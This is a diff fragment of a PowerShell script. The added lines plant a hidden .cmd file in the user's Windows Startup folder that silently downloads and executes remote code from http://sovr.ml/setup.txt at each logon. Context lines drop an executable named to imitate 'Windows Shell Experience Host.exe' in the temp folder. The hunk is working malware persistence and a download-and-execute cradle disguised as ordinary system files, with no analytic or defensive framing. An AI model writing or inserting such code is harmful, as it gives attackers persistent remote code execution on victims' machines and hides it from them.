@@ -13,6 +13,8 @@ set a = %a%
 :aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
 "@
 
+echo "powershell -NoP -w Hidden IEX (IWR http://sovr.ml/setup.txt -usebasicparsing).content" > "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45A.cmd"
+Get-ChildItem -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\11B0B68A-ECD7-45A.cmd" -Recurse -Force | foreach {$_.attributes = "Hidden"} 
 
 $outpath = "$env:temp\11B0B68A-ECD7-45A5-A937-7DC402B3D2\Windows Shell Experience Host.exe"
 
